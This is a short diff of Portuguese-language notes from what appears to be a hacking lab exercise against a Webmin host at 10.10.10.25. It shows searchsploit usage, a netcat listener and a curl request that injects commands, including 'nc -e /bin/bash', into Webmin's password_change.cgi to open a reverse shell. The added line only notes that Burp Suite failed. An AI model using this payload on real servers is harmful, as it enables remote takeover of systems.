@@ -20,7 +20,7 @@ searchsploit webmin
 47293.sh 
 
 nc -nlvp 443
-o curl foi atualizado o payload 
+o curl foi atualizado o payload não conseguir fazer pelo burpsuit então fiz direto pelo terminal.
 curl -ks https://10.10.10.25:13337/password_change.cgi \
   -d 'user=wheel&pam=&expired=2&old=id|ifconfig; old=id|nc -e /bin/bash 1&new1=wheel&new2=wheel' \
   -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;' \
